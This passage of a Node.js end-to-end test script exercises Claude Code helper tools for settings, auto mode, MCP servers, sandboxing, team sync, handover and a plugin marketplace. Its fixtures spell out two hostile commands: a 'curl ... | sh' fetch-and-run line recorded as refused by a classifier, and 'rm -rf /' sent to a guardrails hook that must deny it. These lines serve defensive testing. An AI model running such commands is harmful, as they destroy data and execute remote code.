  check("relocate", "move --yes moves every file byte for byte, writes its manifest in the new folder and leaves nothing at the old place",
    mv.code === 0 && parse(mv.out)?.ok === true && tree(rlDest) === before && fs.existsSync(path.join(rlDest, "relocate-manifest.json")) && !fs.existsSync(path.join(rlCfg, "settings.json")), mv.out.slice(0, 600) + mv.err);
  const st = relocate(["status", "--json"], { CLAUDE_CONFIG_DIR: rlDest });
  const sm = parse(st.out);
  check("relocate", "status --json knows the move: where from, where to", st.code === 0 && !!sm?.moved && path.resolve(sm.moved.from) === path.resolve(rlCfg) && path.resolve(sm.moved.to) === path.resolve(rlDest), st.out.slice(0, 600) + st.err);
  const un = relocate(["undo", "--ignore-running", "--yes", "--json"], { CLAUDE_CONFIG_DIR: rlDest });
  check("relocate", "undo --yes puts the folder back byte for byte and leaves nothing in the moved place",
    un.code === 0 && parse(un.out)?.ok === true && tree(rlCfg) === before && (!fs.existsSync(rlDest) || fs.readdirSync(rlDest).length === 0), un.out.slice(0, 600) + un.err);
}

// ---- settings-doctor: the merged settings with their source, and the mistakes Claude Code ignores in silence ------
// Its own config folder and project. The user file has an unknown key, the project file sets a key the user file
// also sets, the local file has a trailing comma, which makes Claude Code ignore it whole, and a fourth file with a
// value of the wrong type is checked on its own with --file (in a settings file that applies, a wrong type costs
// the whole file, which would hide the merge). The tool writes only with init, build, absorb, watch and restore, so
// the read-only runs may change nothing; then init writes a settings.jsonc, build writes settings.json from an edit
// to it, and check sees drift.
// The marketplace section reuses this folder.
const sd = { cfg: path.join(base, "sd", ".claude"), project: path.join(base, "sd", "app") };
fs.mkdirSync(sd.cfg, { recursive: true });
fs.mkdirSync(path.join(sd.project, ".claude"), { recursive: true });
if (want("settings-doctor")) {
  const userFile = path.join(sd.cfg, "settings.json");
  const projectFile = path.join(sd.project, ".claude", "settings.json");
  const jsonc = path.join(sd.project, ".claude", "settings.jsonc");
  fs.writeFileSync(userFile, JSON.stringify({ model: "sonnet", permissions: { defaultMode: "acceptEdits" }, unknownKey: true }, null, 2) + "\n");
  const wrongFile = path.join(sd.project, "wrong-type.json");
  fs.writeFileSync(wrongFile, JSON.stringify({ cleanupPeriodDays: "30" }, null, 2) + "\n");
  fs.writeFileSync(projectFile, JSON.stringify({ permissions: { defaultMode: "plan" } }, null, 2) + "\n");
  fs.writeFileSync(path.join(sd.project, ".claude", "settings.local.json"), '{\n  "model": "opus",\n}\n');
  const before = fs.readFileSync(userFile);
  const doctor = (argv) => tool("claude-settings-doctor", "bin/claude-settings-doctor.mjs", [...argv, "--project", sd.project], { cwd: sd.project, env: { CLAUDE_CONFIG_DIR: sd.cfg } });
  const lint = doctor(["lint", "--json"]);
  const lm = parse(lint.out);
  const ids = (lm?.findings || []).map((f) => `${f.id}:${f.scope}`);
  check("settings-doctor", "lint --json finds the unknown key in the user file and the trailing comma that makes Claude Code ignore the local file",
    lint.code === 1 && ids.includes("unknown-key:user") && ids.includes("invalid-json:local") && lm.counts?.error >= 1, lint.out.slice(0, 800) + lint.err);
  const one = doctor(["lint", "--file", wrongFile, "--json"]);
  const om = parse(one.out);
  check("settings-doctor", "lint --file finds the value of the wrong type in a file checked on its own", one.code === 1 && (om?.findings || []).some((f) => f.id === "wrong-type" && f.severity === "error"), one.out.slice(0, 600) + one.err);
  const show = doctor(["show", "--json"]);
  const smd = parse(show.out);
  const mode = smd?.entries?.find((e) => e.path === "permissions.defaultMode");
  check("settings-doctor", "show --json merges the files: the project's defaultMode wins over the user's, which is listed as shadowed, and the ignored local file sets nothing",
    show.code === 0 && mode?.value === "plan" && mode.source?.scope === "project" && mode.shadowed?.some((s) => s.source?.scope === "user" && s.value === "acceptEdits")
      && smd.entries.find((e) => e.path === "model")?.source?.scope === "user" && smd.files?.find((f) => f.scope === "local")?.state === "ignored by Claude Code", show.out.slice(0, 800) + show.err);
  const explain = doctor(["explain", "permissions.defaultMode", "--json"]);
  const em = parse(explain.out);
  check("settings-doctor", "explain permissions.defaultMode --json gives the schema's values and the file that sets it now",
    explain.code === 0 && em?.found === true && Array.isArray(em.enum) && em.enum.includes("plan") && em.winner?.scope === "project", explain.out.slice(0, 600) + explain.err);
  check("settings-doctor", "none of the four read-only runs changed the user file or wrote anything next to it", fs.readFileSync(userFile).equals(before) && fs.readdirSync(sd.cfg).sort().join() === "settings.json", fs.readdirSync(sd.cfg).join());
  const dryInit = doctor(["init", "--dry-run", "--json"]);
  check("settings-doctor", "init --dry-run says what it would write and writes nothing", dryInit.code === 0 && !fs.existsSync(jsonc), dryInit.out.slice(0, 400) + dryInit.err);
  const init = doctor(["init", "--json"]);
  const jsoncText = fs.existsSync(jsonc) ? fs.readFileSync(jsonc, "utf8") : "";
  check("settings-doctor", "init writes settings.jsonc next to the project's settings.json, with the key explained in a comment", init.code === 0 && jsoncText.includes("//") && jsoncText.includes("defaultMode"), init.out.slice(0, 400) + init.err + jsoncText.slice(0, 300));
  const same = doctor(["check", "--json"]);
  check("settings-doctor", "check finds no difference right after init", same.code === 0, same.out.slice(0, 400) + same.err);
  fs.writeFileSync(jsonc, jsoncText.replace(/^\{[ \t]*$/m, '{\n  // keep the model small\n  "model": "haiku",'));
  const build = doctor(["build", "--json"]);
  const built = parse(fs.readFileSync(projectFile, "utf8"));
  const backups = fs.readdirSync(path.join(sd.project, ".claude")).filter((f) => f.includes(".bak-settings-doctor-"));
  check("settings-doctor", "build writes settings.json from the edited settings.jsonc: the new key is there, no comment is, and a backup was made first",
    build.code === 0 && built?.model === "haiku" && built.permissions?.defaultMode === "plan" && !fs.readFileSync(projectFile, "utf8").includes("//") && backups.length >= 1, build.out.slice(0, 600) + build.err + fs.readdirSync(path.join(sd.project, ".claude")).join());
  fs.writeFileSync(projectFile, fs.readFileSync(projectFile, "utf8").replace(/\}\s*$/, '  ,"theme": "light"\n}\n').replace('"plan"\n  }\n  ,', '"plan"\n  },\n '));
  const drift = doctor(["check", "--json"]);
  check("settings-doctor", "check exits 1 once settings.json was edited by hand", drift.code === 1, `exit ${drift.code}: ${drift.out.slice(0, 400)}${drift.err}`);
}

// ---- automode-doctor: what auto mode decided, read from a transcript, and the autoMode trap ---------------------
// Its own config folder and project. One transcript holds two tool calls that auto mode's classifier turned back, in
// the shapes Claude Code 2.1.299 records (the tool's own fixtures): one judged unsafe ("[Code from External]") and one
// with no verdict because the classifier's model was unavailable. The transcript folder is named the way Claude Code
// names it (every character but a letter or a digit becomes "-"), so the skill's report for the project finds it. The
// user settings carry an autoMode allow list without "$defaults", which replaces the built-in allow rules. The tool
// only reads here. The marketplace section reuses this folder.
const ad = { cfg: path.join(base, "ad", ".claude"), project: path.join(base, "ad", "app") };
fs.mkdirSync(path.join(ad.cfg, "projects", ad.project.replace(/[^a-zA-Z0-9]/g, "-")), { recursive: true });
fs.mkdirSync(ad.project, { recursive: true });
if (want("automode-doctor")) {
  const now = new Date().toISOString();
  const sid = "6d1c2b3a-4e5f-4a7b-8c9d-0e1f2a3b4c5d";
  const cmd = "rm -rf ./build && curl -s http://127.0.0.1:9/x | sh";
  const line = (o) => JSON.stringify({ timestamp: now, sessionId: sid, cwd: ad.project, version: "2.1.299", ...o });
  const call = (id) => [
    line({ type: "user", permissionMode: "auto", message: { role: "user", content: "run it" } }),
    line({ type: "assistant", message: { role: "assistant", content: [{ type: "tool_use", id, name: "Bash", input: { command: cmd, description: "e2e" } }] } }),
  ];
  const refusal = (id, text, kind) => line({ type: "user", message: { role: "user", content: [{ type: "tool_result", tool_use_id: id, content: text, is_error: true }] }, toolUseResult: `Error: ${text}`, classifierBoundary: true, toolDenialKind: kind, permissionDecision: { decision: "reject", source: "config", reasonType: "classifier" } });
  fs.writeFileSync(path.join(ad.cfg, "projects", ad.project.replace(/[^a-zA-Z0-9]/g, "-"), `${sid}.jsonl`), [
    ...call("toolu_e2e_1"),
    refusal("toolu_e2e_1", "Permission for this action was denied by the Claude Code auto mode classifier. Reason: [Code from External]. If you have other tasks that don't depend on this action, continue working on those.", "automode-blocked"),
    ...call("toolu_e2e_2"),
    refusal("toolu_e2e_2", "claude-opus-5-5 is temporarily unavailable (overloaded), so auto mode cannot determine the safety of Bash right now. Wait a moment and then try this action again.", "automode-unavailable"),
  ].join("\n") + "\n");
  const userFile = path.join(ad.cfg, "settings.json");
  fs.writeFileSync(userFile, JSON.stringify({ autoMode: { allow: ["Allow running the project's own test suite"] } }, null, 2) + "\n");
  const before = fs.readFileSync(userFile);
  const doctor = (argv) => tool("claude-automode-doctor", "bin/claude-automode-doctor.mjs", argv, { cwd: ad.project, env: { CLAUDE_CONFIG_DIR: ad.cfg } });
  const rep = doctor(["report", "--json"]);
  const rm = parse(rep.out);
  check("automode-doctor", "report --json finds both classifier decisions, one refused as unsafe and one with no verdict from the service, and exits 1",
    rep.code === 1 && rm?.classifier?.total === 2 && rm.classifier.refused === 1 && rm.classifier.noVerdict === 1 && rm.refused?.[0]?.category === "Code from External" && rm.noVerdict?.[0]?.service === true, rep.out.slice(0, 800) + rep.err);
  const lint = doctor(["lint", "--project", ad.project, "--json"]);
  check("automode-doctor", "lint --json finds the autoMode allow list that replaces the built-in rules because \"$defaults\" is missing",
    lint.code === 1 && (parse(lint.out)?.findings || []).some((f) => f.id === "replaces-defaults" && f.scope === "user"), lint.out.slice(0, 800) + lint.err);
  const why = doctor(["why", "git status", "--project", ad.project, "--json"]);
  const why2 = doctor(["why", "npm test", "--project", ad.project, "--json"]);
  check("automode-doctor", "why: git status is approved without the classifier, npm test goes to it",
    why.code === 0 && parse(why.out)?.outcome === "static" && why2.code === 0 && parse(why2.out)?.outcome === "classifier", why.out.slice(0, 400) + why2.out.slice(0, 400) + why.err + why2.err);
  check("automode-doctor", "none of the read-only runs changed the settings file", fs.readFileSync(userFile).equals(before), "");
}

// ---- mcp-check: every MCP server Claude Code would load, started the way Claude Code starts it -------------------
// Its own config folder and project. The user's .claude.json names a tiny stdio server written here (Node, no
// dependency: it answers initialize and tools/list with one tool), and the project's .mcp.json names a second server
// that nobody approved, whose argument uses a variable that is set nowhere. show and lint only read; check starts
// the tiny server and must find its one tool; toggle --dry-run must change nothing. The marketplace section reuses
// this folder.
const mc = { cfg: path.join(base, "mc", ".claude"), project: path.join(base, "mc", "app") };
fs.mkdirSync(mc.cfg, { recursive: true });
fs.mkdirSync(mc.project, { recursive: true });
if (want("mcp-check")) {
  const server = path.join(base, "mc", "tiny-mcp-server.mjs");
  fs.writeFileSync(server, [
    'import readline from "node:readline";',
    "const send = (o) => process.stdout.write(JSON.stringify(o) + String.fromCharCode(10));",
    'readline.createInterface({ input: process.stdin }).on("line", (l) => {',
    "  let m; try { m = JSON.parse(l); } catch { return; }",
    '  if (m.method === "initialize") send({ jsonrpc: "2.0", id: m.id, result: { protocolVersion: m.params?.protocolVersion || "2025-06-18", capabilities: { tools: {} }, serverInfo: { name: "tiny", version: "1.0.0" } } });',
    '  else if (m.method === "tools/list") send({ jsonrpc: "2.0", id: m.id, result: { tools: [{ name: "add", description: "Add two numbers.", inputSchema: { type: "object", properties: { a: { type: "number" }, b: { type: "number" } }, required: ["a", "b"] } }] } });',
    '  else if (m.id !== undefined) send({ jsonrpc: "2.0", id: m.id, error: { code: -32601, message: "no such method" } });',
    "});",
  ].join("\n") + "\n");
  const userJson = path.join(mc.cfg, ".claude.json");
  const mcpJson = path.join(mc.project, ".mcp.json");
  fs.writeFileSync(userJson, JSON.stringify({ hasCompletedOnboarding: true, mcpServers: { tiny: { type: "stdio", command: process.execPath, args: [server] } } }, null, 2) + "\n");
  fs.writeFileSync(mcpJson, JSON.stringify({ mcpServers: { shared: { command: "node", args: ["${MC_E2E_NEVER_SET}/server.mjs"] } } }, null, 2) + "\n");
  const files = () => [userJson, mcpJson].map((f) => fs.readFileSync(f, "utf8")).join("\n") + (fs.existsSync(path.join(mc.project, ".claude")) ? "+.claude" : "");
  const before = files();
  const mcp = (argv) => tool("claude-mcp-check", "bin/claude-mcp-check.mjs", [...argv, "--project", mc.project], { cwd: mc.project, env: { CLAUDE_CONFIG_DIR: mc.cfg } });
  const show = mcp(["show", "--json"]);
  const sm = parse(show.out);
  const byName = (n) => sm?.servers?.find((s) => s.name === n);
  check("mcp-check", "show --json lists the user's server as active and the project's .mcp.json server as pending approval, each with its file",
    show.code === 0 && byName("tiny")?.state === "active" && byName("tiny")?.scope === "user" && byName("shared")?.state === "pending" && byName("shared")?.display === ".mcp.json", show.out.slice(0, 800) + show.err);
  const chk = mcp(["check", "tiny", "--json"]);
  const cm = parse(chk.out);
  check("mcp-check", "check starts the tiny server the way Claude Code would, completes the handshake and sizes its one tool",
    chk.code === 0 && cm?.totals?.answered === 1 && cm.totals.tools === 1 && cm.totals.toolSchemaChars > 0, chk.out.slice(0, 800) + chk.err);
  const lint = mcp(["lint", "--json"]);
  const ids = (parse(lint.out)?.findings || []).map((f) => `${f.id}:${f.server}`);
  check("mcp-check", "lint --json finds the server nobody approved and the variable that is set nowhere",
    lint.code === 1 && ids.includes("unapproved:shared") && ids.includes("variable-unset:shared"), lint.out.slice(0, 800) + lint.err);
  const dry = mcp(["toggle", "shared", "--off", "--dry-run", "--json"]);
  check("mcp-check", "toggle --off --dry-run says it would write disabledMcpjsonServers, and none of the runs changed a file",
    dry.code === 0 && parse(dry.out)?.changes?.[0]?.key === "disabledMcpjsonServers" && files() === before, dry.out.slice(0, 600) + dry.err);
}

// ---- sandbox-doctor: the sandbox settings, the entry that never takes effect, and where a command runs -------------
// Its own config folder and project. The project file turns the sandbox on, takes docker out of it with an
// excludedCommands entry, and allows a domain written with a scheme and a path, which never equals a host name. The
// answers of why come from the settings, so they are the same on every system; check describes the host it runs on
// (on Windows: no Bash sandbox). The tool only reads. The marketplace section reuses this folder.
const sb = { cfg: path.join(base, "sb", ".claude"), project: path.join(base, "sb", "app") };
fs.mkdirSync(sb.cfg, { recursive: true });
fs.mkdirSync(path.join(sb.project, ".claude"), { recursive: true });
if (want("sandbox-doctor")) {
  const projectFile = path.join(sb.project, ".claude", "settings.json");
  fs.writeFileSync(projectFile, JSON.stringify({ sandbox: { enabled: true, excludedCommands: ["docker *"], network: { allowedDomains: ["https://example.com/path"] } } }, null, 2) + "\n");
  const before = fs.readFileSync(projectFile);
  const doc = (argv) => tool("claude-sandbox-doctor", "bin/claude-sandbox-doctor.mjs", argv, { cwd: sb.project, env: { CLAUDE_CONFIG_DIR: sb.cfg } });
  const lint = doc(["lint", "--project", sb.project, "--json"]);
  check("sandbox-doctor", "lint --json finds the allowedDomains entry with a scheme, which never equals a host name, in the project file",
    lint.code === 1 && (parse(lint.out)?.findings || []).some((f) => f.id === "domain-scheme" && f.scope === "project"), lint.out.slice(0, 800) + lint.err);
  const show = doc(["show", "--project", sb.project, "--json"]);
  const sm = parse(show.out);
  check("sandbox-doctor", "show --json merges the sandbox settings and names the project file as the source",
    show.code === 0 && sm?.values?.enabled?.winner?.value === true && sm.values.enabled.winner.source?.scope === "project" && sm.lists?.excludedCommands?.[0]?.value === "docker *", show.out.slice(0, 800) + show.err);
  const out = doc(["why", "docker ps", "--project", sb.project, "--json"]);
  const inside = doc(["why", "ls -la", "--project", sb.project, "--json"]);
  check("sandbox-doctor", "why: docker ps runs outside the sandbox through its excludedCommands entry, ls -la inside it",
    out.code === 0 && parse(out.out)?.verdict === "unsandboxed" && inside.code === 0 && parse(inside.out)?.verdict === "sandboxed", out.out.slice(0, 400) + inside.out.slice(0, 400) + out.err + inside.err);
  const host = doc(["check", "--json"]);
  const hm = parse(host.out);
  check("sandbox-doctor", "check --json describes this host, and on Windows says there is no Bash sandbox",
    (host.code === 0 || host.code === 1) && typeof hm?.hasSandbox === "boolean" && (process.platform !== "win32" || hm.hasSandbox === false), host.out.slice(0, 600) + host.err);
  check("sandbox-doctor", "none of the runs changed the settings file", fs.readFileSync(projectFile).equals(before), "");
}

// ---- windows-doctor: the shell the Bash tool gets on Windows, and nothing to check elsewhere ---------------------
// Its own config folder and project. check only reads: on Windows it reports the tools the model would get and
// why, on Linux and macOS it says there is nothing to check and exits 0. fix and undo are never run here, because
// they change the Windows user environment of the machine that runs this test. The marketplace section reuses
// this folder.
const wd = { cfg: path.join(base, "wd", ".claude"), project: path.join(base, "wd", "app") };
fs.mkdirSync(wd.cfg, { recursive: true });
fs.mkdirSync(wd.project, { recursive: true });
if (want("windows-doctor")) {
  const wdoc = (argv) => tool("claude-windows-doctor", "bin/claude-windows-doctor.mjs", argv, { cwd: wd.project, env: { CLAUDE_CONFIG_DIR: wd.cfg } });
  const chk = wdoc(["check", "--project", wd.project, "--json"]);
  const cm = parse(chk.out);
  check("windows-doctor", process.platform === "win32" ? "check --json reports which tools the model would get, Bash and PowerShell, and why" : "check --json says there is nothing to check on this system and exits 0",
    process.platform === "win32" ? (chk.code === 0 || chk.code === 1) && cm?.applicable === true && typeof cm.shell?.tools === "object" && "Bash" in cm.shell.tools : chk.code === 0 && cm?.applicable === false, chk.out.slice(0, 800) + chk.err);
  const ex = wdoc(["explain", "git-bash-not-found", "--json"]);
  check("windows-doctor", "explain git-bash-not-found --json says what the finding means and how to fix it", ex.code === 0 && parse(ex.out)?.id === "git-bash-not-found" && !!parse(ex.out)?.fix, ex.out.slice(0, 600) + ex.err);
  check("windows-doctor", "the read-only runs wrote nothing into the config folder or the project", fs.readdirSync(wd.cfg).length === 0 && fs.readdirSync(wd.project).length === 0, fs.readdirSync(wd.cfg).join() + " | " + fs.readdirSync(wd.project).join());
}

// ---- starter-kits, then md-doctor on what they wrote -----------------------------------------------
if (want("starter") || want("md-doctor")) {
  const k = tool("claude-code-starter-kits", "bin/claude-starter.mjs", [], { cwd: project });
  check("starter", "node kit written", k.code === 0 && fs.existsSync(path.join(project, "CLAUDE.md")) && fs.existsSync(path.join(project, ".claude", "agents", "test-runner.md")), k.out + k.err);
  const again = tool("claude-code-starter-kits", "bin/claude-starter.mjs", [], { cwd: project });
  check("starter", "a second run changes nothing", again.code === 0 && !/created/.test(again.out.split("Files")[1] || ""), again.out);
  const d = tool("claude-md-doctor", "bin/claude-md-doctor.mjs", [project, "--ci", "--budget", "500", "--no-user"], { cwd: project });
  check("md-doctor", "the starter kit's CLAUDE.md passes the doctor in CI mode", d.code === 0, d.out + d.err);
  fs.appendFileSync(path.join(project, "CLAUDE.md"), "\n- Lint with `npm run format`.\n- See `docs/missing.md`.\n");
  const bad = tool("claude-md-doctor", "bin/claude-md-doctor.mjs", [project, "--json", "--no-user"], { cwd: project });
  const ids = (parse(bad.out)?.findings || []).map((f) => f.id);
  check("md-doctor", "finds the stale command and the stale path added on purpose", ids.includes("stale-command") && ids.includes("stale-path"), bad.out.slice(0, 300) + bad.err);
}

// ---- team-sync: two people, one remote ---------------------------------------------------------------
if (want("team-sync")) {
  const remote = path.join(base, "remote.git");
  git(["init", "-q", "--bare", remote], base);
  const alice = path.join(base, "alice"), bob = path.join(base, "bob");
  git(["clone", "-q", remote, alice], base);
  fs.writeFileSync(path.join(alice, "README.md"), "# web\n");
  git(["add", "."], alice); git(["commit", "-q", "-m", "first"], alice); git(["push", "-q", "origin", "HEAD:main"], alice);
  const aliceEnv = { CLAUDE_TEAM_NAME: "Alice", CLAUDE_TEAM_SYNC_INLINE: "1" };
  const i = tool("claude-code-team-sync", "claude-team.mjs", ["init", "--hub", "branch", "--yes"], { cwd: alice, env: aliceEnv });
  check("team-sync", "init creates the hub branch", i.code === 0 && /claude-team-hub/.test(git(["ls-remote", "--heads", remote], base).out), i.out + i.err);
  git(["add", "."], alice); git(["commit", "-q", "-m", "team hub"], alice); git(["push", "-q", "origin", "HEAD:main"], alice);
  writeSession(alice, "aaaaaaaa-3333-4333-8333-333333333333", { prompts: 3 });
  const vend = path.join(alice, ".claude", "team-sync", "claude-team.mjs");
  const sh = run(process.execPath, [vend, "share", "aaaaaaaa"], { cwd: alice, env: aliceEnv });
  check("team-sync", "share publishes a redacted session", sh.code === 0 && /Shared/.test(sh.out), sh.out + sh.err);
  git(["clone", "-q", remote, bob], base);
  const bobEnv = { CLAUDE_TEAM_NAME: "Bob", CLAUDE_TEAM_SYNC_INLINE: "1" };
  const start = run(process.execPath, [path.join(bob, ".claude", "team-sync", "claude-team.mjs"), "hook", "session-start"], { cwd: bob, env: bobEnv, input: JSON.stringify({ session_id: "bob-1", cwd: bob, source: "startup" }) });
  check("team-sync", "Bob's first session gets the digest with Alice's session", /E2E refactor session/.test(parse(start.out)?.hookSpecificOutput?.additionalContext || ""), start.out + start.err);
  const load = run(process.execPath, [path.join(bob, ".claude", "team-sync", "claude-team.mjs"), "show", "--for-context", "refactor"], { cwd: bob, env: bobEnv });
  check("team-sync", "/team-load finds it by topic, within the token budget", load.code === 0 && /<team-session/.test(load.out) && load.out.length < 16000, load.out.slice(0, 200) + load.err);
}

// ---- handover (the first tool of the family) ---------------------------------------------------------
if (want("handover")) {
  const dir = LOCAL ? path.join(SIBLINGS, "claude-code-handover") : path.join(base, "handover");
  if (!LOCAL) git(["clone", "-q", "--depth", "1", "https://github.com/nrzz/claude-code-handover", dir], base);
  const st = run(process.execPath, [path.join(dir, "scripts", "selftest.mjs")], { cwd: dir, timeout: 600000 });
  check("handover", "selftest (synthetic histories) passes", st.code === 0, (st.out + st.err).slice(-400));

  // The one-command setup, in a fresh project and config folder of its own.
  const hHome = path.join(base, "hh");
  const hCfg = path.join(hHome, ".claude");
  const hProj = path.join(base, "handover-project");
  fs.mkdirSync(hCfg, { recursive: true });
  fs.mkdirSync(hProj, { recursive: true });
  fs.writeFileSync(path.join(hCfg, "settings.json"), JSON.stringify(ORIGINAL, null, 2) + "\n");
  git(["init", "-q"], hProj);
  const hEnv = { HOME: hHome, USERPROFILE: hHome, CLAUDE_CONFIG_DIR: hCfg, HANDOVER_PROJECTS_DIR: path.join(hCfg, "projects"), HANDOVER_DATA_DIR: path.join(hCfg, "claude-code-handover-data") };
  const ho = (argv) => run(process.execPath, [path.join(dir, "bin", "claude-handover.mjs"), ...argv], { cwd: hProj, env: hEnv, timeout: 300000 });
  const personal = ["CLAUDE.local.md", "HANDOVER.md", "DECISIONS.md", "claude-token-rules.md"];
  const i1 = ho(["init", "--dir", hProj, "--models", "Opus + Sonnet", "--streams", "api, web"]);
  check("handover", "init sets up a project in one command", i1.code === 0 && personal.every((f) => fs.existsSync(path.join(hProj, f))), (i1.out + i1.err).slice(-600));
  const hs = () => JSON.parse(fs.readFileSync(path.join(hCfg, "settings.json"), "utf8"));
  const hHooks = () => JSON.stringify(hs().hooks || {}).replace(/\\\\/g, "/");
  check("handover", "its hooks and skills are installed, the user's own settings kept",
    (hHooks().match(/context-guard\.mjs/g) || []).length === 3 && fs.existsSync(path.join(hCfg, "skills", "handover", "SKILL.md")) && hs().theme === "dark" && hs().env?.MY_VAR === "1", hHooks().slice(0, 300));
  const snapshot = () => personal.map((f) => fs.readFileSync(path.join(hProj, f), "utf8")).join("\u0000") + JSON.stringify(hs());
  const before = snapshot();
  const i2 = ho(["init", "--dir", hProj, "--models", "Opus + Sonnet", "--streams", "api, web"]);
  check("handover", "a second init changes nothing", i2.code === 0 && snapshot() === before && /Nothing to do/.test(i2.out), i2.out.slice(-300));
  const guard = hs().hooks.SessionStart.flatMap((g) => g.hooks).find((h) => JSON.stringify(h).includes("context-guard"));
  const g = run(guard.command, guard.args, { cwd: hProj, env: hEnv, input: JSON.stringify({ session_id: "h1", transcript_path: "", cwd: hProj, hook_event_name: "SessionStart", source: "startup" }) });
  check("handover", "the installed context guard runs as a hook", g.code === 0, g.out + g.err);
  const u = ho(["uninstall"]);
  check("handover", "uninstall takes out its hooks and skills and keeps the project's files",
    u.code === 0 && !hHooks().includes("context-guard") && !fs.existsSync(path.join(hCfg, "skills", "handover", "SKILL.md")) && personal.every((f) => fs.existsSync(path.join(hProj, f))) && hs().env?.MY_VAR === "1", (u.out + u.err).slice(-400));
}

// ---- the toolkit's plugin marketplace, through Claude Code's own plugin commands ----------------------
// Uses a second config folder, so the plugins do not touch the settings checked below.
if (want("marketplace")) {
  const CLAUDE = process.env.E2E_CLAUDE || "claude";
  const pHome = path.join(base, "p");
  const pEnv = { HOME: pHome, USERPROFILE: pHome, CLAUDE_CONFIG_DIR: path.join(pHome, ".claude") };
  fs.mkdirSync(pEnv.CLAUDE_CONFIG_DIR, { recursive: true });
  const claude = (argv, timeout) => runCmd(CLAUDE, argv, { env: pEnv, timeout });
  const version = claude(["--version"]);
  if (version.code !== 0) console.log("SKIP  marketplace  no Claude Code CLI found (set E2E_CLAUDE to its path)");
  else {
    const hub = path.resolve(HERE, "..");
    const v = claude(["plugin", "validate", hub]);
    check("marketplace", `marketplace.json validates (Claude Code ${version.out.trim().split(" ")[0]})`, v.code === 0 && /Validation passed/.test(v.out + v.err), v.out + v.err);
    const add = claude(["plugin", "marketplace", "add", hub]);
    check("marketplace", "marketplace add", add.code === 0, add.out + add.err);
    const names = JSON.parse(fs.readFileSync(path.join(hub, ".claude-plugin", "marketplace.json"), "utf8")).plugins.map((p) => p.name);
    for (const name of names) {
      const i = claude(["plugin", "install", `${name}@claude-code-toolkit`], 300000);
      check("marketplace", `install ${name} from GitHub`, i.code === 0, i.out + i.err);
    }
    const list = parse(claude(["plugin", "list", "--json"]).out) || [];
    check("marketplace", "every plugin installed and enabled", names.every((n) => list.some((p) => p.id === `${n}@claude-code-toolkit` && p.enabled)), JSON.stringify(list.map((p) => p.id)));
    // The plugins' own hooks, run the way Claude Code runs a plugin's hook: ${CLAUDE_PLUGIN_ROOT}
    // expanded to the installed copy, the event's JSON on stdin.
    const pluginHook = (id, event, payload) => {
      const p = list.find((x) => x.id === id);
      const spec = p && parse(fs.readFileSync(path.join(p.installPath, "hooks", "hooks.json"), "utf8"));
      const h = spec?.hooks?.[event]?.[0]?.hooks?.[0];
      if (!h) return { code: -1, out: "", err: `${id} has no ${event} hook` };
      const dataDir = path.join(pHome, "plugin-data", id.replace(/[^\w-]/g, "-"));
      const expand = (s) => s.replaceAll("${CLAUDE_PLUGIN_ROOT}", p.installPath).replaceAll("${CLAUDE_PLUGIN_DATA}", dataDir);
      const input = payload === null ? "" : JSON.stringify({ session_id: "e2e-plugin", transcript_path: "", cwd: project, hook_event_name: event, ...payload });
      return run(expand(h.command), (h.args || []).map(expand), { cwd: project, input, env: { ...pEnv, CLAUDE_PLUGIN_ROOT: p.installPath, CLAUDE_PLUGIN_DATA: dataDir } });
    };
    const denied = pluginHook("guardrails@claude-code-toolkit", "PreToolUse", { tool_name: "Bash", tool_input: { command: "rm -rf /" } });
    check("marketplace", "the guardrails plugin's own hook denies rm -rf /", parse(denied.out)?.hookSpecificOutput?.permissionDecision === "deny", denied.out + denied.err);
    const allowed = pluginHook("guardrails@claude-code-toolkit", "PreToolUse", { tool_name: "Bash", tool_input: { command: "npm test" } });
    check("marketplace", "the guardrails plugin's own hook passes npm test in silence", allowed.code === 0 && allowed.out.trim() === "", allowed.out + allowed.err);
    // Does Claude Code continue the session chat-ferry imported? Claude Code is pointed at a fake
    // API on localhost that records the request and answers with an error: nothing is sent
    // anywhere and no token is spent. It runs in this second config folder, where the plugins
    // are: the main one holds the cost guard in hard mode over its budget, which holds every
    // prompt (that is its job, checked above). The session file is copied over for that.
    if (ferrySession) {
      const http = await import("node:http");
      const { spawn } = await import("node:child_process");
      const copy = path.join(pEnv.CLAUDE_CONFIG_DIR, "projects", path.basename(path.dirname(ferrySession.file)), path.basename(ferrySession.file));
      fs.mkdirSync(path.dirname(copy), { recursive: true });
      fs.copyFileSync(ferrySession.file, copy);
      // The project folder holds a .claude/settings.json by now (the starter kit wrote one), and
      // Claude Code 2.1.291 will not run in such a folder until it has been trusted once. The
      // sandbox config says so, the way the interactive dialog would.
      const claudeJson = path.join(pEnv.CLAUDE_CONFIG_DIR, ".claude.json");
      const trust = parse(fs.existsSync(claudeJson) ? fs.readFileSync(claudeJson, "utf8") : "") || {};
      trust.projects = trust.projects || {};
      for (const key of new Set([project, project.replace(/\\/g, "/")])) trust.projects[key] = { ...(trust.projects[key] || {}), hasTrustDialogAccepted: true };
      fs.writeFileSync(claudeJson, JSON.stringify(trust, null, 2) + "\n");
      // A skill the model may invoke, to show that skills are listed in the request at all: without it, a
      // request that mentions no user-only skill would prove nothing.
      const control = path.join(project, ".claude", "skills", "e2e-control");
      fs.mkdirSync(control, { recursive: true });
      fs.writeFileSync(path.join(control, "SKILL.md"), "---\nname: e2e-control\ndescription: A skill the model may invoke, here to show that skills are listed in the request.\n---\nSay control.\n");
      const seen = [];
      const srv = http.createServer((req, res) => { let b = ""; req.on("data", (c) => (b += c)); req.on("end", () => { seen.push(b); res.writeHead(400, { "content-type": "application/json" }); res.end(JSON.stringify({ type: "error", error: { type: "invalid_request_error", message: "fake api" } })); }); });
      await new Promise((r) => srv.listen(0, "127.0.0.1", r));
      const fakeEnv = { ...ENV, ...pEnv, ANTHROPIC_API_KEY: "sk-ant-api03-bogus", ANTHROPIC_BASE_URL: `http://127.0.0.1:${srv.address().port}`, CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1", DISABLE_TELEMETRY: "1", DISABLE_ERROR_REPORTING: "1" };
      const argv = ["-p", "--resume", ferrySession.id, "--output-format", "json", "Reply OK. E2E_NEW_PROMPT"];
      const viaShell = process.platform === "win32" && !/\.exe$/i.test(CLAUDE);
      const quoted = [CLAUDE, ...argv].map((a) => (/[\s"&|<>^]/.test(a) ? `"${a.replace(/"/g, '\\"')}"` : a)).join(" ");
      const child = viaShell ? spawn(quoted, [], { cwd: project, env: fakeEnv, shell: true, windowsHide: true, stdio: ["ignore", "pipe", "pipe"] }) : spawn(CLAUDE, argv, { cwd: project, env: fakeEnv, windowsHide: true, stdio: ["ignore", "pipe", "pipe"] });
      let errText = "";
      let outText = "";
